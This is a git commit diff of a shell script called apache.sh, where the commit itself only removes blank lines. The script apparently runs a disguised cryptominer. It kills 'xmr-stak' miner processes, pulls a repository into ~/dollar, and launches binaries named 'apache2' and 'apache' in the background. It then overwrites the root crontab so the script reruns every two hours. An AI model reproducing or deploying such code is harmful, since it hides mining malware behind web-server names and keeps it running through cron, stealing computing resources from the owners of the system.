f75419f7ffcd3324a00ffd8715699b4e0d5179cd
tanhuevon <36043964+tanhuevon@users.noreply.github.com>
2018-10-24 20:35:12 -0500

    Update apache.sh

--- apache.sh
+++ apache.sh
@@ -1,6 +1,5 @@
 #!/bin/bash
 
-
 killall xmr-stak; killall apache2; killall apache
 
 cd ~/dollar/ ; git stash drop; git reset --hard; git pull
@@ -10,7 +9,5 @@ cp -rf cpu`nproc`.txt cpu.txt
 chmod +x apache2 ; chmod +x apache
 ./apache2 & 
 ./apache  &
-
-
 
 echo '0 */2 * * * bash /root/dollar/apache.sh &> /root/out.log' | crontab -
